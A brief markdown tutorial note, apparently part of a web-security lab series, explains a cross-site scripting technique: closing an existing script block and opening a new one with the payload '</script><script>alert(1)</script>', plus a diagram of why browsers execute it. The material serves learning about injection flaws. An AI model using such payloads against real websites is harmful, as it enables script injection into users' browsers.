# Terminating The Existing Script

## Overview

Sometimes user input appears inside a:

```html
<script>
```

block.

Example:

```html
<script>

var input = 'USER_INPUT';

</script>
```

---

# Attack Idea

Instead of breaking the string directly, terminate the current script block and create a new one.

Payload:

```html
</script><script>alert(1)</script>
```

---

# Why It Works

Browser Processing:

```text
HTML Parsing
        ↓
Script Block Ends
        ↓
New Script Block Starts
        ↓
JavaScript Executes
```

---

# Example

Original:

```html
<script>

var input='USER_INPUT';

</script>
```

---

Injected:

```html
</script>
<script>
alert(1)
</script>
```

---

Result:

```javascript
alert(1)
```

executes successfully.

---

# Related Lab

- Lab18

---

# Key Takeaways

- HTML parsing occurs before JavaScript parsing.
- Breaking the surrounding script is often enough.
- Useful when quotes are escaped.